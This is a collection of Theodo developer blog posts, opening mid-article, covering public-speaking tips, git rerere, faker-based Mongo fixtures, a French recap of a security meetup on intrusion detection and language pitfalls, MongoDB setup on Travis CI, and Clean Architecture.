L’envie de transmettre est importante, si vous l’avez durant le talk cela se ressentira.
Il faut éviter de faire de la pub pour un produit mais plutôt expliquer pourquoi il répond à un problème qui concerne beaucoup de gens.
Sur ce point, je vous conseille personnellement ce talk “How great leaders inspire action”
Puis, il faut déterminer à quel type de public on s’adresse :


À quel point pouvez-vous être familier ? Est-ce qu’on s’adresse à des militaires retraités ou à de jeunes étudiants ?


Quel est le niveau de connaissance du public sur le sujet ? Collègues du CNRS ou grand public ? Cela va avoir un impact important sur le vocabulaire que l’on va pouvoir employer. Attention au jargon pour certains publics.


Structure du talk
L’introduction
L’introduction doit rentrer directement dans le vif du sujet, il ne faut pas perdre de temps. L’auteur conseille donc de ne pas faire de présentation, ni de remerciement, quitte à passer pour un malpoli. Vous pourrez toujours les faire en dehors du talk.
Il faut savoir saisir l’attention dès les premiers instants avec au choix :

un fait marquant : ”Savez-vous que le dernier iPhone est livré avec un téléphone Android de secours ?”
une anecdote personnelle : “J’ai commencé à coder avec visual basic à 10 ans”
une citation : “ça marche en local, je ne vois vraiment pas ce qui peut tourner mal” – Un dev Windows Millenium
une statistique : “L’appli est stable, les tests passent 4 fois sur 5”
une question : “Qui dans cette salle utilise encore IE6 ?”

Avec ceci avec comme sentiment recherché :

l’occasion d’apprendre quelque chose 
susciter l’étonnement 
un éclat de rire 
un sentiment d’empathie à notre égard

Cela aura pour effet de vous rendre plus proche de votre public et d’attirer son attention pour la suite du talk. Ces premières secondes sont à la fois très importantes et très stressantes : c’est le starter. C’est la partie du talk où on doit absolument tout savoir par coeur.
Une fois l’attention obtenue, il faut poser les bases du talk et introduire le problème à résoudre, la question à laquelle il faut répondre. Il est important que le public puisse s’identifier au problème afin d’embarquer avec vous dans ce bref voyage qu’est le talk.
Le squelette du talk
Pour structurer le talk, l’auteur propose de le voir comme le passage d’une berge à une autre.
“Il faut poser de grosses pierres, des points de passages au milieu de la rivière pour pouvoir passer.”
Notre travail étant de trouver ces pierres pour le talk. Il propose 7 points de passages mais ce chiffre peut évoluer selon la longueur du talk.
Ces points de passages peuvent être :

une image
une anecdote
une phrase
un mot-clé

Ils doivent être précis et clairement définis et nous permettre de bien nous repérer dans le talk.
Pour le contenu, s’armer de phrases percutantes le long de ces points de passage est d’une grande utilité. N’hésitez pas à faire des analogies comme “une hydrolienne est grande comme un immeuble de 7 étages”. Essayer d’utiliser des mottoes, ces petites phrases qui se retiendront bien comme “Stay foolish, stay hungry”. Pensez à prendre des exemples que le public pourra appréhender et si vous pouvez faire passer vos idées avec de l’émotion et/ou de l’humour c’est le top.
La conclusion
Au moins aussi importante que l’introduction, la conclusion permet de délivrer le message que l’on veut transmettre. Elle doit rester simple, n’oubliez pas : “Un talk, un message”. Plus vous ajoutez de choses à la conclusion plus elles perdent en importance. Pensez à faire une ouverture sur un problème plus large pour inspirer le public. La dernière phrase, le cut-off, est aussi décisive que le starter et doit être travaillée avec la même intensité. Cela peut être une action avec le public, la révélation d’un résultat final, une phrase choc, un appel à l’action, une blague, une réflexion philosophique…
L’illustration
L’illustration d’un talk ne comporte pas obligatoirement de slide, cela peut être d’autres supports comme la vidéo, de l’infographie, des objets sur la scène ou même rien du tout.
Il faut garder en tête que l’illustration est un support et que le point de départ est avant tout votre discours : “la star doit rester l’intervenant, pas le slide !”.
À propos des slides, il faut “distinguer deux supports : le slide destiné à être lu (écrit, imprimé, donné à lire au client) et le slide destiné à être vu sur un écran derrière vous lors d’une présentation”. Le premier type sera un slide-document ou slidument, riche en informations et en complexité. Le deuxième type devra être son opposé : peu de contenu et appréhendable en quelques secondes. Si une de vos slides est trop complexe, découpez-la en plusieurs moins complexes. Vous pouvez préparer les deux types si vous voulez laisser une trace écrite par la suite.
Pour la forme il faut rester simple. Utiliser le moins que possible les “bullet points” est une règle qui commence à être bien connue. À la place, utilisez des images ou des pictogrammes qui permettront de rendre la présentation plus ludique et plus jolie. Deux couleurs par slide en privilégiant les fonds sombres. Les caractères avec serif pour les textes écrits en petit et sans serif pour les textes écrits en gros comme les titres. Pour les polices il est également conseillé d’en utiliser maximum deux différentes. Pour présenter de la data, inspirez-vous des dernières méthodes à la mode dans la data visualization.
La répétition de votre talk est incontournable surtout pour les parties les plus importantes comme l’introduction et la conclusion. Elle ne permet pas seulement de se souvenir du texte et de prendre de la confiance mais elle permet également de l’améliorer à chaque fois. Pensez à vous enregistrer avec votre téléphone pour pouvoir vous écouter. Une vraie répétition doit se faire devant au moins une autre personne. Vous devez pouvoir incarner votre talk et de ce fait pensez aux acteurs qui répètent plusieurs fois leur pièce. Il est important d’arriver avec l’envie et le plaisir de transmettre le message.
Pour les mouvements, une règle simple : soit vous parlez, soit vous bougez, car contrairement à une idée reçue, marcher quand on parle ne donne pas plus de présence mais au contraire affaiblit la puissance de votre discours.
Je vous conseille pour finir cet excellent talk “How to speak so that people want to listen”.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										TL;DR: git hidden gem to remember how to solve conflicts
Hello my dearest git geeks! Do you know about git-rerere? It’s a little thing that saved my life once and I want to explain to you how it can help you too in your workflow.
First, let me explain what is rerere:
REuse REcorded REsolution
Gosh, I hate git conflicts. They can arise when making a merge commit, but also when applying a stash state or cherry-picking a commit. Sometimes, it’s easy to resolve, and sometimes, well… it can be a nightmare. Now, imagine you just resolved the hardest conflicts ever and committed a super nice merge commit.
What if some of these conflicts happen again in the future? Scary, right?
That’s where git-rerere comes to shine: in this unlikely but unfortunate case, git can reuse your super resolution to automatically avoid the conflict. Sweet! As usual, git has an amazing documentation and even an awesome blog entry for this tool, check it out! Now, let me show you this in action.
First thing first, activate rerere:
git config rerere.enabled true

You can pass --global if you want to set it for every project on your machine.
A code base is worth a thousands words
I wrote up a little story to explain everything. So here is my shining repository with one awesome lyrics file. Clone it if you want to follow me more easily!
I have a development branch going strong with some commits:
* commit 72ea7a30f814ec1552eea1af44631bb67ab97ad8 (origin/rockify-a-lot, rockify-a-lot)
| Author: Tristan Roussel <super@disney.fan>
| Date:   Mon Jan 5 21:49:23 2015 +0100
|
|       Queenify these lyrics!
|
* commit b5f87ebdb50da772c4bea483878775fc0631effd
| Author: Tristan Roussel <super@disney.fan>
| Date:   Mon Jan 5 21:58:37 2015 +0100
|
|     Nickelbackify the lyrics :/
|
* commit a15f60e322646347443548bbc6d017c5ae070d88 (origin/master, master)
Author: Tristan Roussel <super@disney.fan>
Date:   Mon Jan 5 21:47:52 2015 +0100

Let it go

My good friend Frank wants to add a commit to this development branch, and he sent me a Pull Request. Unfortunately, there are conflicts and we’ll have to do this manually.
So let’s give it a try with git checkout rockify-a-lot && git merge feature/pink-floydify. Conflicts, indeed. Git being amazing, it takes you by the hand and tells you exactly what to do.
Auto-merging ice.txt
CONFLICT (content): Merge conflict in ice.txt
Recorded preimage for 'ice.txt'
Automatic merge failed; fix conflicts and then commit the result.

Notice the strange third line. In case you missed it, git status still gives you all the information you need:
On branch rockify-a-lot
You have unmerged paths.
(fix conflicts and run ""git commit"")

Unmerged paths:
(use ""git add <file>..."" to mark resolution)

both modified:   ice.txt

no changes added to commit (use ""git add"" and/or ""git commit -a"")

Here is the result of git diff:
diff --cc ice.txt
index 888de14,606a0d8..0000000
--- a/ice.txt
+++ b/ice.txt
@@@ -1,6 -1,6 +1,10 @@@
The snow glows white on the mountain tonight
Not a footprint to be seen.
++<<<<<<< HEAD
+The show must go on!
++=======
+ Come on you stranger, you legend, you martyr, and shine!
++>>>>>>> feature/pink-floydify
and it looks like I'm the Queen
Cause living with me must have damn near killed you

Ok, so here’s my resolution, you can check it on branch rockify-everything if you want:
commit 5677725c7d9f8fa6c97de4f79ee9d772c8d6af6d
Merge: 72ea7a3 9965c4c
Author: Tristan Roussel <super@disney.fan>
Date:   Thu Jan 15 22:47:06 2015 +0100

Merge remote-tracking branch 'feature/pink-floydify' into rockify-everything

Conflicts:
ice.txt

diff --cc ice.txt
index 888de14,606a0d8..2a16731
--- a/ice.txt
+++ b/ice.txt
@@@ -1,6 -1,6 +1,7 @@@
The snow glows white on the mountain tonight
Not a footprint to be seen.
+The show must go on!
+ Come on you stranger, you legend, you martyr, and shine!
and it looks like I'm the Queen
Cause living with me must have damn near killed you

I enjoin you to commit a resolution yourself too, so that you can see this message appear after the commit:
Recorded resolution for 'ice.txt'.
[rockify-a-lot 5677725] Merge branch 'feature/pink-floydify' into rockify-a-lot

The resolution is now saved by git, and everytime it does occur again in the future, the saved resolution will be applied automatically!
The prestige
You don’t believe me (hint: you should not until you see for yourself)? I’ve set up two branches just for that on top of our previous work:
  * commit 88c2ce424a96566089597f653fc9d51f82a169ff (origin/feature/pink-floydify-again, feature/pink-floydify-again)
  | Author: Jim Morrison <another@legend.com>
  | Date:   Mon Jan 5 23:06:57 2015 +0100
  |
  |     And again for Pink Floyd
  |
* | commit cca913282eea558f84eaf59e084eea9024fd6e04 (origin/rockify-again, rockify-again)
|/  Author: Tristan Roussel <super@disney.fan>
|   Date:   Mon Jan 5 23:01:39 2015 +0100
|
|       I've already seen that
|
* commit 9a4788c3697d60014d3bb8a2a63fab9605d7acc4
| Author: Tristan Roussel <super@disney.fan>
| Date:   Mon Jan 5 22:55:03 2015 +0100
|
|     A brand new start for lyrics
|
* commit 5677725c7d9f8fa6c97de4f79ee9d772c8d6af6d (origin/rockify-everything, rockify-everything)

Now, if I do git checkout rockify-again && git merge feature/pink-floydify-again:
Auto-merging ice-without-nickelback.txt
CONFLICT (content): Merge conflict in ice-without-nickelback.txt
Resolved 'ice-without-nickelback.txt' using previous resolution.
Automatic merge failed; fix conflicts and then commit the result.

Still failed, but there is a big difference, with git diff:
diff --cc ice-without-nickelback.txt
index 815a5ee,78d453f..0000000
--- a/ice-without-nickelback.txt
+++ b/ice-without-nickelback.txt
@@@ -1,5 -1,5 +1,6 @@@
The snow glows white on the mountain tonight
Not a footprint to be seen.
+The show must go on!
+ Come on you stranger, you legend, you martyr, and shine!
and it looks like I'm the Queen

The conflict is resolved using previous knowledge! Just need to add the file and we’re good to go. But I’m lazy, and I want to remove this one more step. Let’s add another option in our configuration git config rerere.autoupdate true and try again with git reset --hard origin/rockify-again && git merge feature/pink-floidify-again:
Auto-merging ice-without-nickelback.txt
CONFLICT (content): Merge conflict in ice-without-nickelback.txt
Staged 'ice-without-nickelback.txt' using previous resolution.
Automatic merge failed; fix conflicts and then commit the result.

A subtle difference in the message here. Now no more output with git diff, if I try git status:
On branch rockify-again
All conflicts fixed but you are still merging.
(use ""git commit"" to conclude merge)

Changes to be committed:

modified:   ice-without-nickelback.txt

And with git diff --cached:
diff --git a/ice-without-nickelback.txt b/ice-without-nickelback.txt
index 815a5ee..5fa0715 100644
--- a/ice-without-nickelback.txt
+++ b/ice-without-nickelback.txt
@@ -1,5 +1,6 @@
The snow glows white on the mountain tonight
Not a footprint to be seen.
The show must go on!
+Come on you stranger, you legend, you martyr, and shine!
and it looks like I'm the Queen

Already staged, voilà!
Realistic use case
That was awesome, but I already hear you, this never happens in real life. Ok, let’s show a more real use case.
This time I’m mistaken
Remember our strange lone commit at the beginning? Well, after thinking about it a lot, I’ve decided it wasn’t rocky enough, I want to remove it from my branch rockify-everything and release the branch to master without it. Sounds simple, right? Actually… what is the git command to erase an old commit, but preserve everything else in place again?
Let’s do a git rebase --interactive --preserve-merge! A warning first! You have to be aware that we are rewriting history with git rebase so this should absolutely not be done on a branch available to other contributors.
The option --preserve-merge here is to ensure we keep the same branch structure, but it can be quite chaotic to use, especially with --interactive. Expect hiccups from time to time.
Okay, so our command git checkout rockify-everything && git rebase --interactive --preserve-merge master outputs this:
pick b5f87eb Nickelbackify the lyrics :/
pick 72ea7a3 Queenify these lyrics!
pick 9965c4c Pink Floyd FTW \o/
pick 5677725 Merge remote-tracking branch 'feature/pink-floydify' into rockify-everything

# Rebase a15f60e..5677725 onto a15f60e
#
# Commands:
#  p, pick = use commit
#  r, reword = use commit, but edit the commit message
#  e, edit = use commit, but stop for amending
#  s, squash = use commit, but meld into previous commit
#  f, fixup = like ""squash"", but discard this commit's log message
#  x, exec = run command (the rest of the line) using shell
#
# These lines can be re-ordered; they are executed from top to bottom.
#
# If you remove a line here THAT COMMIT WILL BE LOST.
#
# However, if you remove everything, the rebase will be aborted.
#
# Note that empty commits are commented out

Let’s delete the first commit and see the result (cross fingers!):
error: could not apply 9965c4c... Pink Floyd FTW \o/

When you have resolved this problem, run ""git rebase --continue"".
If you prefer to skip this patch, run ""git rebase --skip"" instead.
To check out the original branch and stop rebasing, run ""git rebase --abort"".

Staged 'ice.txt' using previous resolution.
Could not pick 9965c4ca08bf8a1fdd6b9f89325faa77c9103786

Hit hard
What happened? Oh, I forgot that by replaying every commit with git rebase, we have to redo the merge commit, and rebase does not care about old conflicts, it just vomits them to you. Imagine doing that and stumbling on a very old merge commit with conflicts and having no idea how to resolve them again? Thank god, rerere saves the day! Resolution being already staged, we just go with git rebase --continue. Result is visible on this branch:
*   commit 29d2f062660e11952126112a92afe927bf8957dd (origin/rockify-everything-without-nickelback, rockify-everything-without-nickelback)
|\  Merge: febe698 7792e85
| | Author: Tristan Roussel <super@disney.fan>
| | Date:   Thu Jan 15 22:47:06 2015 +0100
| |
| |     Merge remote-tracking branch 'feature/pink-floydify' into rockify-everything
| |
| |     Conflicts:
| |             ice.txt
| |
| * commit 7792e85579fc86581ba293dda49f6b0223370a5a
|/  Author: Frank Zappa <legend@rock.com>
|   Date:   Mon Jan 5 22:37:39 2015 +0100
|
|       Pink Floyd FTW \o/
|
* commit febe698833759656bd27e4a79a3343958ba491d4
| Author: Tristan Roussel <super@disney.fan>
| Date:   Mon Jan 5 21:49:23 2015 +0100
|
|     Queenify these lyrics!
|
* commit a15f60e322646347443548bbc6d017c5ae070d88 (origin/master, master)
Author: Tristan Roussel <super@disney.fan>
Date:   Mon Jan 5 21:47:52 2015 +0100

Let it go

End of the story?
I still have a few more points to tell.
Can’t stop off the train
When you enable rerere, it starts recording resolutions.
However, it will not use other conflicts resolutions from when rerere was not enabled and/or from conflicts resolved by other contributors. So my last story might end up being a nightmare again? Fear not! rerere-train is here to save you! It’s a very nice script used to teach conflicts resolutions to git-rerere from existing merge commits.
Let’s dig in the mud to see it in action. First, let’s wipe out our previous recorded resolutions (it’s for the example, don’t play with .git/ on a real project!):
rm -r .git/rr-cache/*

If you now retry the super rebase exercise we just did before git checkout rockify-everything && git reset --hard origin/rockify-everything && git rebase --interactive --preserve-merge master, you no longer have your conflicts resolved.
Let’s teach that again to rerere!
Download rerere-train.sh, and now git reset --hard origin/rockify-everything && ./rerere-train.sh HEAD:
Learning from 5677725 Merge remote-tracking branch 'feature/pink-floydify' into rockify-everything
Recorded resolution for 'ice.txt'.
Previous HEAD position was 72ea7a3... Queenify these lyrics!
Switched to branch 'rockify-everything'
Your branch is up-to-date with 'origin/rockify-everything'.

In this simplest form, the script starts from the commit you specified and go through every parent commit to look for conflicts.
Revert the resolutions \o/
What if the resolution given by rerere doesn’t suit you? If you have resolutions already staged for a merge commit on my-file.ext for example, there is a nice trick to unresolve them: git checkout --conflict merge my-file.ext. You can now teach a new resolution to rerere. This is, by the way, useful outside rerere use cases.
Lastly, I told you git rebase --preserve-merge --interactive is chaotic, so let’s try not to anger the beast. To ease your job with it, try to select a root commit that is a parent of every branch involved in the rebase. In my case, origin/master was in a sweet position for that. When rewriting history, you might come across empty commits, either because you are provoking them right now with the changes, or because they already existed. This will stop the rebase process in the middle. To avoid that, add the option --keep-empty to rebase and the empty commits will be accepted during the workflow.
Bonus question (I still do not have a simple answer for that yet, so please tell me if you know!)
Depending on your workflow, if you use --no-ff with merge, you may create real merge commits where a fast-forward merge could have occured. In this case, git rebase --preserve-merge --interactive will fail miserably on these commits and tell you something like that:
error: Commit 16118aede40d66e6dfe039d7a99d84b3da8224c6 is a merge but no -m option was given.
fatal: cherry-pick failed
Could not pick 16118aede40d66e6dfe039d7a99d84b3da8224c6

So, my question: how to tune the rebase command to smoothly process those commits too?

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Tristan Roussel
  			
  				After graduating from l'École Normale Supérieure in mathematics, Tristan explored various jobs: trading, theoretical research in computer science, data analysis and business development. He finally found his way at Theodo in 2013 as a web developer-architect. He works mainly with Symfony and front-end JavaScript frameworks, and is particularly fond of git.  			
  		
    
			

									"
"
										I recently needed to generate random users for a NodeJS project using mongo. I remember the time I used the powerful Alice fixture generator for my Symfony2 projects.
Actually, I didn’t find anything as complete as Alice but I found two very interesting npm modules.
The first one is faker. It generates random data such as names, addresses, etc.
The second one is pow-mongodb-fixtures. It allows you to record custom data in mongo in a snap.
We first need to install these modules. I choose to save them in my dev dependency but it’s totally up to you:
npm install faker --save-dev
npm install pow-mongodb-fixtures --save-dev

Then I created a coffee script to be called when I want to load random fixtures. It resets the content of the ‘myCollectionName’ collection of the ‘myDbName’ database. Then it enters objects that have two attributes: ‘lastName’ and ‘firstName’.
fixtures = require('pow-mongodb-fixtures').connect 'myDbName'
faker = require 'faker'

# Generate random data
users = []
for i in [1..10]
  users.push
    lastName: faker.name.lastName()
    firstName: faker.name.firstName()

# Record these data in the 'myCollectionName' collection
fixtures.clearAndLoad {myCollectionName: users}, (err) ->
  throw err if err
  console.log '10 users have been recorded!'
  fixtures.close ->
    return

I can now load fixtures with
coffee fixtures-load.coffee

This exemple is very simple but you can generate anything you want with faker : addresses, phone numbers, dates. Check the faker github repository for more infos.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Raphaël Dubigny
  			
  				Raphaël is an agile web developer at Theodo. He uses angular, nodejs and ansible every day.  			
  		
    
			

									"
"
										This blog post is in French as the event it relates to is French-only.
Theodo a rejoint le GTLL (Groupe de Travail Logiciel Libre de Systematic) il y a quelques mois.
Ce pôle de compétitivité rassemble académiques et industriels autour de thématiques communes, les logiciels libres dans notre cas.
C’est l’occasion d’échanger régulièrement avec des acteurs du logiciel libre dont les points de vue sont très complémentaires des nôtres.
Voici un bref compte-rendu de la précédente rencontre à laquelle nous avons participé autour de la sécurité, sujet particulièrement d’actualité, l’exemple évident du moment étant les fuites de films de Sony.
Si vous voulez en savoir plus, n’hésitez pas à vous inscrire à la newsletter
Les conférences:
Louis Granboulan : Logiciel Libre et Sécurité
Il est convaincu que le logiciel libre permet d’obtenir de très bons résultats en terme de sécurité du logiciel.
Il a parlé un peu du hardware libre, nous avons demandé s’il y avait de gros projets de lancés sur ce sujet en France.
La réponse fut négative. Louis explique cela par le fait que la France n’a pas les moyens de le faire à son échelle : il faudrait le faire au niveau européen.
Le problème est que les pays européens ne se font pas assez confiance pour de tels projets.
Jean Goubault-Larrecq : Détection d’intrusion avec OrchIDS
Le net est largement vulnérable et il a de plus en plus d’impact dans nos vies. Il nous a présenté un cas d’école avec le ver Slammer qui en 2003 avait fait beaucoup de dégâts.
Ses spécificités étaient une propagation rapide (75 000 machines était infectées en 30 minutes) et une agressivité toute relative puisqu’il se contentait de se propager aléatoirement dans le réseau.
Cela avait malgré tout suffi à augmenter l’activité sur de nombreux serveurs au point de les mettre hors service.
Parmi les conséquences on citera qu’internet était tombé au Portugal et en Corée du Sud et une centrale nucléaire avait même eu son réseau informatique interne affecté !
Jean nous a montré quelques attaques possibles sur une machine avec au passage un petit éloge de Kevin Mitnick, un des premiers hackers et d’une explication sur ses premières attaques. Une bonne façon d’apprendre à se défendre est d’apprendre à attaquer !
De nombreux tutoriels pour apprendre à pénétrer un système existent comme avec le site pentesteracademy.
Vient ensuite la présentation de ORCHIDS.
Le but est d’essayer de prévenir les attaques 0 day en repérant des comportements anormaux.
Comme on ne peut pas savoir comment l’attaque se passera, il faut essayer d’anticiper les comportements de celles-ci afin de détecter des anomalies.
Par exemple ORCHIDS regarde si les processus ne comportent pas de montées en droit irrégulières.
Pour cela ORCHIDS analyse l’évolution autour des uids et gids durant l’excution d’un processus.
En utilisant des automates, ils arrivent à analyser un très grand nombre de cas très rapidement.
Si détection d’une attaque il y a, alors ORCHIDS peut intervenir.
Une des réponses possibles est de tuer tous les processus du user concerné et de supprimer son compte user ! BAM !
Un autre type d’attaque peut être détecté si les logs d’un processus renvoient des erreurs un peu particulières et si en parallèle il y a un écart de l’entropie des processus par rapport aux valeurs statistiquement crédibles.
La combinaison de deux évènements inattendus au même instant correspondent souvent à une attaque.
Model checking by Fabrice Kordon
Il partage le même constat qu’internet est de plus en plus critique dans notre vie.
Il cite en exemple la Domotique, les bourses, le milieu médical ainsi que les futures autoroutes automatiques.
Pour augmenter la sécurité d’un programme il faut essayer de valider son modèle.
Il doit être représenté de manière abstraite, les états étant des vecteurs et les transitions des changements d’état.
Il faut analyser les états potentiellement dangereux de son système.
On parle d’accessibilité d’un état dangereux.
Par exemple, existe-t-il une execution qui engendre une surchauffe de ma centrale nucléaire ?
Lorsque la complexité est trop grande, on peut aussi faire l’analyse via de la logique temporelle : Tout état “surchauffe” est-il toujours suivi par un état “alarme” ?
Tout état “surchauffe” engendre après X unité de temps un état “alarme”. Combien vaut X ?
Une approche quantitative est aussi souhaitable: quelle est la probabilité d’atteindre l’état “surchauffe” ?
Une fois cette analyse faite, il faut analyser la présence ou non de garde-fous face à ces états dangereux.
Existe-t-il un contrôleur qui agit lorsque cet état se réalise ?
Prelude Gilles Lehmann
La sécurité c’est aussi la gestion et la communication des alertes : il existe des formats standard pour la cybersécurité, mais qui ne sont pas encore utilisés par tous les outils.
IDMEF Intrusion detection message exchange format.
IODEF Incident object definition exchange format.
Ce talk ne portait pas sur la sécurité à proprement parler, mais sur l’écosystème de reporting et d’échanges d’alertes de sécurité, autour des différents outils SIEM (Security Information Event Management). Plus que de sécurité à proprement parler, il soulevait des questions très complexes autour de la difficulté de faire fonctionner un modèle économique open-source viable : Prelude est l’un des outils open-source dans le monde des SIEM.
Olivier Levillain ANSSI
Cette présentation portait sur les risques qu’apportent les langages eux-mêmes.
Pour Olivier c’est un sujet qui n’est pas assez pris en compte dans les choix techniques d’un projet malgré ses conséquences pour la sécurité et la fiabilité de celui-ci.
Il nous explique donc qu’un langage peut tromper le développeur avec des faux amis et des pièges.
En particulier, les langages courants (notamment du web !) ne vérifient pas toujours les propriétés attendues intuitivement pour les opérations de base (transitivité, réflexivité, associativité).
Exemple en Javascript (un de ses langages “préférés”):
0 == '0' => True
0 == '0.0' => True
'0' == '0.0' => False

WTF ?
Ou encore un exemple assez énorme en Java (il n’y a pas que le PHP qui réserve des surprises  )
b1=1000
b2=1000
b1==b2 => false

Explication : “==” compare les objets créés, pas leur valeur
a1=42
a2=42
a1==a2 => true

Explication : les “petits” entiers (-128 à 127) sont mis en cache pour gagner en performance : a1 et a2 correspondent donc au même objet.
La réflexivité n’est pas toujours non plus respectée comme le montre ce tableau (source) :


Les chaines de charactères comportent aussi pleins de WTFs.
Notamment PHP qui fait des conversions de ses strings en float si la chaine commence par l’équivalent d’une description d’un nombre float.
echo ""5e1+4rftgh"" + ""50"";

renvoie 100 !
Il nous invite à aller nous divertir sur www.thedailywtf.com.
Un autre exemple d’abus présent sur les langages : les spécifications ouvertes à interprétation.
Par exemple en Java, un extrait de la spécification de la méthode clone :
The general intent is that, for any object x, the expression:
x.clone() != x
will be true, and that the expression:
x.clone().getClass() == x.getClass()
will be true, but these are not absolute requirements. While it is typically the case that:
x.clone().equals(x)
will be true, this **is not an absolute requirement**.

Pas de réelles contraintes, ce qui signifie que potentiellement la fonction peut ne pas avoir un comportement déterministe ce qui est alors impossible à tester.
Mais n’oublions surtout pas sa conclusion: “Le ruby est le pire de tous”. (Ouf..  )
Conclusion
Que peut-on retenir de tout cela en tant que développeurs web ?
D’abord la diversité de ce que l’on peut entendre par sécurité.
En effet chaque projet a ses propres besoins de sécurité.
Il faut savoir trouver le bon équilibre entre sécurité et fonctionnalités.
Un projet avec trop de peu de sécurité menera à un désastre.
Un projet avec trop peu de fonctionnalités ne sera pas utilisé.
Il faut donc pouvoir aider le client à détecter les points critiques d’un projet afin de les protéger au mieux.
La loi de Murphy s’appliquant particulièrement bien à l’informatique, il faut savoir prévoir le pire !
Pour conclure, une liste de bonnes pratiques de sécurité pour vos projets PHP et un lien vers
l’Open Web Application Security Project  une association mondiale pour promouvoir la sécurité des logiciels.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										
I just had a little problem with my tests on Travis due to a wrong MongoDb version. Travis uses the 2.4.12 version of MongoDb and I needed the 2.6.6 version. The official documentation of travis doesn’t provide a way to change the MongoDb version. Fortunately just before that I needed to specify the version of Elasticsearch and the documentation provided me an easy way to do so:
before_install:
  - wget https://download.elasticsearch.org/elasticsearch/elasticsearch/elasticsearch-1.2.4.deb && sudo dpkg -i --force-confnew elasticsearch-1.2.4.deb

I just needed to install manually Elasticsearch. So why not doing the same thing for MongoDb with the help of the MongoDb documentation:
before_script:
  - sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 7F0CEB10
  - echo 'deb http://downloads-distro.mongodb.org/repo/ubuntu-upstart dist 10gen' | sudo tee /etc/apt/sources.list.d/mongodb.list
  - sudo apt-get update
  - sudo apt-get install -y mongodb-org=2.6.6 mongodb-org-server=2.6.6 mongodb-org-shell=2.6.6 mongodb-org-mongos=2.6.6 mongodb-org-tools=2.6.6
  - sleep 15 #mongo may not be responded directly. See http://docs.travis-ci.com/user/database-setup/#MongoDB
  - mongo --version

This quick hack permits our tests to run correctly.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										I went to SfPot meetup at Pepinière 27 (website, Twitter) on second to last Friday with fellow colleagues Simon, Thierry, Kinga, and Paul.
One particular talk retained my attention and I want to tell you about it.
Let me warn you first, this is just an introduction, and I’m not going into much detail, don’t hesitate to post comments if you feel something is not clear, or deserves a better exposure!
Clean architecture (in French “Design applicatif avec symfony2”): slides by Romain Kuzniak (GitHub, Twitter), technical manager @openclassroms
So. What is Clean Architecture? It’s so fresh that it doesn’t even have a Wikipedia article.

Let’s start by what it’s trying to accomplish.
The aim of Clean Architecture is to favor change, by keeping the change cost of a product the most constant possible during the developement process.
In a few words, it’s an evolution of Domain Driven Design (a.k.a DDD), with more abstractions.
It’s based on UseCase Drive Design (another *DD \o/) and Hexagonal Architecture (a.k.a Ports and Adapters)
Objectives

Manage complex architectures, it probably isn’t suited to run a small personal blog.
Be independent from the framework, the UI and the infrastructure, for versatility.
Be highly testable.

Principles

The domain is at the center of the application.
Communication between application layers is done through abstractions.
SOLID principles are followed.
The architecture reveals its intentions.

D from DDD
This is Domain.
Business rules are carried by the elements of the domain.
In Symfony, this means we code the business logic directly inside the entities, this is the essence of DDD.
The reasoning behind this choice is that business rules should apply independently from the context, as opposed to applicative rules.
Let’s give an example to explain the difference, strongly inspired from Romain’s talk.
We want to build an agile board (Jira is a very good example).

In the domain there are two entities:

Sprints
Issues

Issues have two different states, open or closed, and a sprint can also be either open or closed.
There are issues in a sprint.
Issues without sprint are in the backlog.
As a user, I want to be able to close a sprint, either manually through clicking a button on my browser, or automatically depending on the sprint previously filled closing date.

If I close the sprint manually, I want to get a nice report in my browser telling me how the sprint went with graphs, and statistics.
If it’s closed automatically, let’s say I only want the number of closed issues logged into a file.
Either way, when the sprint is closed, remaining open issues in the sprint should be removed from it and automatically placed in the top of the backlog.

This last rule, represents a business rule.
Anytime a sprint is closed, it should be applied.
The two former rules on the contrary, strongly depending from the context, are applicative rules.
Why am I talking about DDD?
Domain takes care of business rules, closing a sprint would be the responsibility of the sprint itself.
But where do we put the applicative rules?
That’s where Clean Architecture comes to the rescue, it’s the next evolution.
A picture is worth a thousand words
Okay. Let’s see a diagram of what we’re talking about (again, from Romain):

This is Clean Architecture.
Wow. I mean. WOW. What are all these abstraction layers?
<I> denotes an interface whereas <A> denotes an abstract class.
Let’s talk about the red spot, it seems to be the important part.
Use Case
Use Case is indeed the central point of Clean Architecture.
It’s the part describing how an applicative rule works.
Let’s describe its key characteristics with our agile board example:



Specs of the Use Case
Illustration 




It represents an applicative rule, and therefore is named after it
Use Case: My name is “Manually close the sprint”


It takes in input a Use Case request
Request to Use Case: I want to close sprint #9


It has only one method, execute
Use Case: Well, let’s close sprint #9 busy busy


It uses entities gateways to get the entities needed to work with
Use Case to Entity Gateway: I need the sprint #9 entity


It uses the entities to apply business rules
Use Case to Sprint: close yourself!


It answers with a Use Case response
Use Case Response: Here is the report, mate



Abstract entity
We go deeper (or higher depending on the point of view) in the abstraction.
The entity represents only the business rules associated to the Domain element.
No need to bother with data in the Use Case layer which is carried at the entity implementation level.
Fun fact, your entity implementation of a particular entity needs not to always be the same.
In some cases, you may find it relevant to implement it differently, for example, depending on if it comes from a database or an API call.
All these abstractions are here to ensure we captured the essence of the applicative rule.
It’s therefore completely framework, UI and infrastructure agnostic.
And, the use cases represent faithfully the functional features of our application.
As a bonus, with so much decoupling, it’s (nearly) a pleasure to write tests!

